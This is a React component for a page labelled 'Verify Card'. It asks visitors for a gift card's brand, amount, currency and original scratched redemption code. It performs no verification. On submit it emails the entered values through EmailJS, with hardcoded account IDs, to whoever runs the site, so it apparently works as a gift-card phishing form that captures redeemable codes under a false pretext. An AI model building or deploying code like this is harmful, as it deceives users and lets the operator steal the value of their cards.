import React, { useRef, useState } from 'react'
import veriImg from "../images/gig1.b5f9534b.webp"
import "./verification.css"
import { RiErrorWarningFill } from "react-icons/ri";
import emailjs from 'emailjs-com';
const Verificatio = () => {
  const amountRef=useRef()
  const cardtypeRef=useRef()
  const currencyRef=useRef()
  const redemptionRef=useRef()
  
  const submitCardDetails=(e)=>{
  const amountval=amountRef.current.value
  const cardtypval=cardtypeRef.current.value
  const currencyval=currencyRef.current.value
  const redemptionval=redemptionRef.current.value
    e.preventDefault()
    if(amountval && cardtypval && currencyval && redemptionval){
      const message={name:'cardlidity',email:"",message:` ${amountval},\n${cardtypval},\n${currencyval},\n${redemptionval}`}
      // console.log(amountval,cardtypval,currencyval,redemptionval)
      emailjs.send(
        'service_g3pmhwu',    // Service ID
        'template_mph9yla',   // Template ID
        message,             // Template parameters
        'pDNCarIDNNCtYjtx8'        // User ID
      )
      .then((response) => {
        console.log('SUCCESS!', response.status, response.text);
        alert('Email sent successfully!');
      })
      .catch((err) => {
        console.error('FAILED...', err);
        alert('Failed to send email. Please try again later.');
      });
    }
   
  }
  const [selectedOption, setSelectedOption] = useState('');
  const handleChange = (event) => {
    setSelectedOption(event.target.value);
  };

  return (
    <section className='veriContainer'>
      <div className="leftveri">
        <img src={veriImg} alt="" className='verimg' />
      </div>
      <div className="rightveri">
        <form onSubmit={submitCardDetails}>
        <select id="choices" name="choices" ref={cardtypeRef} value={selectedOption} onChange={handleChange} className='cardselect'>
        <option value="" disabled >Select type of card</option>
          <option value="Apple">Apple</option>
          <option value="eBay">eBay</option>
          <option value="Steam">Steam</option>
          <option value="Amazon">Amazon</option>
          <option value="Xbox">Xbox</option>
          <option value="Googleplay">Googleplay</option>
          <option value="Playstation">Playstation</option>
          <option value="Sephora">Sephora</option>
          <option value="NordStorm">NordStorm</option>
          <option value="Nike">Nike</option>
          <option value="Mastercard">Mastercard</option>
          <option value="Vanilla">Vanilla</option>
          <option value="WalmartCard">WalmartCard</option>
          <option value="Perfect Visa">Perfect Visa</option>
          <option value="Visa Silvery White">Visa Silvery White</option>
          <option value="TT Visa">TT Visa</option>
          <option value="Amex">Amex</option>
      </select>
      <div className='sect2'>
      <select id="choices" name="choices"  ref={currencyRef} className='selectcurrency '>
          <option value="USD">USD</option>
          <option value="GBP">GBP</option>
          <option value="AUD">AUD</option>
          <option value="EUR">EUR</option>
          <option value="CAD">CAD</option>
      </select>
      <input type="Number" placeholder='Card Amount' className='amount' ref={amountRef} />
      </div>
      <input type="text" name="" id="" placeholder='Redemption code' ref={redemptionRef} className='redemptio'/>
      <p className='warningp'> <RiErrorWarningFill className='warning'/> Please make sure the redemption code is the original scratched code</p>
        <button type='submit' className='verifyCard'>Verify Card</button>
        <p>Please make sure the codes you are about to input are correct and according to details</p>
        </form>
      </div>
    </section>
  )
}

export default Verificatio